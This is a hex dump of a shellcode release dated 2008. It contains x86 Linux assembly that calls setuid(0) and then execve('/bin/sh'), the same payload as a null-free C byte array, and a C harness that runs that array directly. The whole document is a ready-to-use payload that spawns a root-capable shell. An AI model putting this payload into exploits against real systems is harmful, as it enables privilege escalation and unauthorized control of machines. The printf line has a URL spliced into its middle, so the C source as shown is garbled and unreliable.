00000000  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000010  2d 2d 2d 5b 41 53 4d 5d  2d 2d 2d 2d 2d 2d 2d 2d  |---[ASM]--------|
00000020  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0d 0a  |--------------..|
00000030  0d 0a 67 6c 6f 62 61 6c  20 5f 73 74 61 72 74 0d  |..global _start.|
00000040  0a 73 65 63 74 69 6f 6e  20 2e 74 65 78 74 0d 0a  |.section .text..|
00000050  5f 73 74 61 72 74 3a 0d  0a 3b 73 65 74 75 69 64  |_start:..;setuid|
00000060  28 30 29 0d 0a 78 6f 72  20 65 62 78 2c 65 62 78  |(0)..xor ebx,ebx|
00000070  0d 0a 6c 65 61 20 65 61  78 2c 5b 65 62 78 2b 31  |..lea eax,[ebx+1|
00000080  37 68 5d 0d 0a 63 64 71  0d 0a 69 6e 74 20 38 30  |7h]..cdq..int 80|
00000090  68 0d 0a 3b 65 78 65 63  76 65 28 22 2f 62 69 6e  |h..;execve("/bin|
000000a0  2f 73 68 22 2c 30 2c 30  29 0d 0a 78 6f 72 20 65  |/sh",0,0)..xor e|
000000b0  63 78 2c 65 63 78 0d 0a  70 75 73 68 20 65 63 78  |cx,ecx..push ecx|
000000c0  0d 0a 70 75 73 68 20 30  78 36 38 37 33 32 66 36  |..push 0x68732f6|
000000d0  65 0d 0a 70 75 73 68 20  30 78 36 39 36 32 32 66  |e..push 0x69622f|
000000e0  32 66 0d 0a 6c 65 61 20  65 61 78 2c 5b 65 63 78  |2f..lea eax,[ecx|
000000f0  2b 30 42 68 5d 0d 0a 6d  6f 76 20 65 62 78 2c 65  |+0Bh]..mov ebx,e|
00000100  73 70 0d 0a 69 6e 74 20  38 30 68 0d 0a 0d 0a 2d  |sp..int 80h....-|
00000110  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000120  2d 2d 5b 2f 41 53 4d 5d  2d 2d 2d 2d 2d 2d 2d 2d  |--[/ASM]--------|
00000130  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0d 0a  |--------------..|
00000140  0d 0a 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |..--------------|
00000150  2d 2d 2d 2d 2d 5b 43 5d  2d 2d 2d 2d 2d 2d 2d 2d  |-----[C]--------|
00000160  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0d 0a  |--------------..|
00000170  0d 0a 23 69 6e 63 6c 75  64 65 20 22 73 74 64 69  |..#include "stdi|
00000180  6f 2e 68 22 0d 0a 0d 0a  63 6f 6e 73 74 20 63 68  |o.h"....const ch|
00000190  61 72 20 73 68 65 6c 6c  63 6f 64 65 5b 5d 3d 20  |ar shellcode[]= |
000001a0  22 5c 78 33 31 5c 78 64  62 22 0d 0a 20 20 20 20  |"\x31\xdb"..    |
000001b0  20 20 20 20 20 20 20 20  22 5c 78 38 64 5c 78 34  |        "\x8d\x4|
000001c0  33 5c 78 31 37 22 0d 0a  20 20 20 20 20 20 20 20  |3\x17"..        |
000001d0  20 20 20 20 22 5c 78 39  39 22 0d 0a 20 20 20 20  |    "\x99"..    |
000001e0  20 20 20 20 20 20 20 20  22 5c 78 63 64 5c 78 38  |        "\xcd\x8|
000001f0  30 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |0"..            |
00000200  22 5c 78 33 31 5c 78 63  39 22 0d 0a 20 20 20 20  |"\x31\xc9"..    |
00000210  20 20 20 20 20 20 20 20  22 5c 78 35 31 22 0d 0a  |        "\x51"..|
00000220  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
00000230  38 5c 78 36 65 5c 78 32  66 5c 78 37 33 5c 78 36  |8\x6e\x2f\x73\x6|
00000240  38 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |8"..            |
00000250  22 5c 78 36 38 5c 78 32  66 5c 78 32 66 5c 78 36  |"\x68\x2f\x2f\x6|
00000260  32 5c 78 36 39 22 0d 0a  20 20 20 20 20 20 20 20  |2\x69"..        |
00000270  20 20 20 20 22 5c 78 38  64 5c 78 34 31 5c 78 30  |    "\x8d\x41\x0|
00000280  62 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |b"..            |
00000290  22 5c 78 38 39 5c 78 65  33 22 0d 0a 20 20 20 20  |"\x89\xe3"..    |
000002a0  20 20 20 20 20 20 20 20  22 5c 78 63 64 5c 78 38  |        "\xcd\x8|
000002b0  30 22 3b 0d 0a 0d 0a 69  6e 74 20 6d 61 69 6e 28  |0";....int main(|
000002c0  29 0d 0a 7b 0d 0a 20 20  20 20 70 72 69 6e 74 66  |)..{..    printf|
000002d0  20 3c 20 68 74 74 70 3a  2f 2f 77 77 77 2e 6f 70  | < http://www.op|
000002e0  65 6e 67 72 6f 75 70 2e  6f 72 67 2f 6f 6e 6c 69  |engroup.org/onli|
000002f0  6e 65 70 75 62 73 2f 30  30 39 36 39 35 33 39 39  |nepubs/009695399|
00000300  2f 66 75 6e 63 74 69 6f  6e 73 2f 70 72 69 6e 74  |/functions/print|
00000310  66 2e 68 74 6d 6c 3e 28  22 5c 6e 53 4d 41 4c 4c  |f.html>("\nSMALL|
00000320  45 53 54 20 53 45 54 55  49 44 20 26 20 45 58 45  |EST SETUID & EXE|
00000330  43 56 45 20 47 4e 55 2f  4c 49 4e 55 58 20 78 38  |CVE GNU/LINUX x8|
00000340  36 20 53 54 41 42 4c 45  20 53 48 45 4c 4c 43 4f  |6 STABLE SHELLCO|
00000350  44 45 22 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |DE"..           |
00000360  20 22 57 49 54 48 4f 55  54 20 4e 55 4c 4c 53 20  | "WITHOUT NULLS |
00000370  54 48 41 54 20 53 50 41  57 4e 53 20 41 20 53 48  |THAT SPAWNS A SH|
00000380  45 4c 4c 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |ELL"..          |
00000390  20 20 22 5c 6e 5c 6e 43  6f 64 65 64 20 62 79 20  |  "\n\nCoded by |
000003a0  43 68 65 6d 61 20 47 61  72 63 69 61 20 28 61 6b  |Chema Garcia (ak|
000003b0  61 20 73 63 68 33 6d 34  29 22 0d 0a 20 20 20 20  |a sch3m4)"..    |
000003c0  20 20 20 20 20 20 20 20  22 5c 6e 5c 74 20 2b 20  |        "\n\t + |
000003d0  73 63 68 33 6d 34 40 6f  70 65 6e 73 65 63 2e 65  |sch3m4@opensec.e|
000003e0  73 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |s"..            |
000003f0  22 5c 6e 5c 74 20 2b 20  68 74 74 70 3a 2f 2f 6f  |"\n\t + http://o|
00000400  70 65 6e 73 65 63 2e 65  73 22 0d 0a 20 20 20 20  |pensec.es"..    |
00000410  20 20 20 20 20 20 20 20  22 5c 6e 5c 6e 5b 2b 5d  |        "\n\n[+]|
00000420  20 44 61 74 65 3a 20 32  39 2f 31 31 2f 32 30 30  | Date: 29/11/200|
00000430  38 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |8"..            |
00000440  22 5c 6e 5b 2b 5d 20 54  68 61 6e 6b 73 20 74 6f  |"\n[+] Thanks to|
00000450  3a 20 76 6c 61 6e 37 22  0d 0a 20 20 20 20 20 20  |: vlan7"..      |
00000460  20 20 20 20 20 20 22 5c  6e 5c 6e 5b 2b 5d 20 53  |      "\n\n[+] S|
00000470  68 65 6c 6c 63 6f 64 65  20 53 69 7a 65 3a 20 25  |hellcode Size: %|
00000480  64 20 62 79 74 65 73 5c  6e 5c 6e 22 2c 0d 0a 20  |d bytes\n\n",.. |
00000490  20 20 20 20 20 20 20 20  20 20 20 73 69 7a 65 6f  |           sizeo|
000004a0  66 28 73 68 65 6c 6c 63  6f 64 65 29 2d 31 29 3b  |f(shellcode)-1);|
000004b0  0d 0a 0d 0a 20 20 20 20  28 2a 28 76 6f 69 64 20  |....    (*(void |
000004c0  28 2a 29 28 29 29 20 73  68 65 6c 6c 63 6f 64 65  |(*)()) shellcode|
000004d0  29 28 29 3b 0d 0a 0d 0a  20 20 20 20 72 65 74 75  |)();....    retu|
000004e0  72 6e 20 30 3b 0d 0a 7d                           |rn 0;..}|
000004e8
